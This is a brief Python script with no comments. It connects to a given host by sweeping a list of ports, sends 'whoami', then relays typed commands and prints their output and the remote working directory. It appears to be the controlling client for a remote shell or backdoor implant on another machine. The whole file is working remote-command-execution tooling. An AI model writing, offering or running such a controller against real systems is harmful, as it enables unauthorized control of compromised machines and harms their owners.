import socket, sys

host = sys.argv[1]
port = 6006

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
portarr = [6006, 80, 443, 25565, 3434, 8235, 9009, 5525, 7771, 11752, 53542, 6324, 57752, 13333]
for port in portarr:
    try:
        s.connect((host, port))
        break
    except:
        continue
print("Connected on port: " + str(port))
nextcmd = 'whoami'
s.sendall((nextcmd + '\r\n').encode())

while True:
    data = s.recv(4096)
    while 'EOFX' not in data.decode():
        data += s.recv(4096)
    datarr = data.decode().split('\r\n')
    for line in datarr[:-3]:
        print(line)
    print("Current path: " + datarr[-3])
    nextcmd = input("%SBS% ")
    if nextcmd == 'quit':
        nextcmd += '\r\n'
        s.sendall(nextcmd.encode())
        s.close()
        break
    else:
        nextcmd += '\r\n'
        s.sendall(nextcmd.encode())
